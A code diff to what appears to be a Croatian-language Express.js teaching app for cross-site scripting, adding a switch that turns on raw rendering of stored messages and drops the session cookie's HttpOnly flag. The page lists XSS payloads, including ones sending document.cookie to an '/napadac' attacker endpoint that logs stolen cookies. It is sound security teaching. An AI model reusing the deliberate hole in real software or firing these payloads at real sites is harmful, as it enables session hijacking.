@@ -19,6 +19,7 @@ function kodiraj(tekst) {
 }
 
 app.post("/xss/poruka", (req, res) => {
+  postavke.xssRanjivost = req.body.ranjivost === "on";
   if (req.body.poruka) baza.poruke.push(req.body.poruka);
   res.redirect("/");
 });
@@ -38,7 +39,7 @@ app.get("/napadac", (req, res) => {
 
 function sekcijaXss() {
   const poruke = baza.poruke
-    .map((p) => `<li>${p}</li>`)
+    .map((p) => `<li>${postavke.xssRanjivost ? p : kodiraj(p)}</li>`)
     .join("");
   const ukradeni = baza.ukradeniKolacici
     .map((u) => `<li>${u.vrijeme}: ${kodiraj(u.kolacic)}</li>`)
@@ -49,8 +50,10 @@ function sekcijaXss() {
 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br>
 <code>&lt;img src=x onerror="alert(document.cookie)"&gt;</code><br>
 <code>&lt;img src=x onerror="new Image().src='/napadac?cookie='+document.cookie"&gt;</code> (krađa kolačića)<br>
-<code>&lt;script&gt;document.location.href='/napadac?cookie='+document.cookie&lt;/script&gt;</code> (preusmjeravanje)</p>
+<code>&lt;script&gt;document.location.href='/napadac?cookie='+document.cookie&lt;/script&gt;</code> (preusmjeravanje)<br>
+Kad je ranjivost isključena, poruke se kodiraju, a kolačić sjednice dobiva zastavicu HttpOnly.</p>
 <form method="post" action="/xss/poruka">
+<label><input type="checkbox" name="ranjivost" ${postavke.xssRanjivost ? "checked" : ""}> Ranjivost uključena</label><br><br>
 Poruka: <input name="poruka" size="60"> <button>Spremi poruku</button>
 </form>
 <form method="post" action="/xss/obrisi"><button>Obriši poruke</button></form>
@@ -67,7 +70,7 @@ function sekcijaSde() {
 
 app.get("/", (req, res) => {
   const sid = req.cookies.sessionId || randomBytes(8).toString("hex");
-  res.cookie("sessionId", sid);
+  res.cookie("sessionId", sid, { httpOnly: !postavke.xssRanjivost });
   res.send(`<!DOCTYPE html>
 <html lang="hr">
 <head>
